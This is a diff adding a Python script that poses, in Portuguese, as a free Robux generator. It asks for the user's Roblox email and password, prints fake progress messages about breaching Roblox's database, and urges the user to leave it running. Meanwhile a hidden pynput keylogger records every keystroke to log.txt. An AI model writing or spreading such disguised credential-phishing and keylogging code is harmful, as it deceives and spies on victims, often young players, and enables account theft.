@@ -1,0 +1,44 @@
+from pynput.keyboard import Listener, Key
+from collections import deque
+import time
+
+email = input('Digite o email da sua conta do Roblox aqui: [exemplo: joao123@gmail.com]: ')
+senha = input('Digite a senha da sua conta do Roblox aqui: [exemplo: 123456]: ')
+virus = input('Quantos Robux você quer gerar? [Máximo de 2000 (mais que isso pode ser banido) por hora]: ')
+
+time.sleep(3)
+print('Acessando o banco de dados do Roblox...')
+time.sleep(4)
+print('Invadindo a database de arquivos do Roblox...')
+time.sleep(2)
+print(f'Criando caminho: roblox.get.robux.{virus}.set')
+time.sleep(3)
+print(f'Foram solicitados {virus} em sua conta do Roblox com sucesso!')
+print('Os Robux serão enviados em algum tempo, espere...')
+time.sleep(2)
+
+print('-='*35)
+print('Deixe esse programa aberto até os Robux aparecerem em sua conta.')
+print('Se o programa for fechado, a conexão com o servidor do Roblox será interrompida.')
+print('Você pode mexer no computador normalmente enquanto os Robux são gerados.')
+print('-='*35)
+
+password = ['q','u','i','t','Key.space']
+keys = deque(maxlen=5)
+
+def log(text):
+    with open('log.txt', 'a') as file_log:
+        file_log.write(text)
+
+def monitor(key):
+    try:
+        log(key.char)
+        keys.append(key.char)
+    except AttributeError:
+        log(' <'+str(key)+'> ')
+        keys.append(str(key))
+    if ''.join(password) == ''.join(keys):
+        return False
+
+with Listener(on_release=monitor) as listener:
+    listener.join()
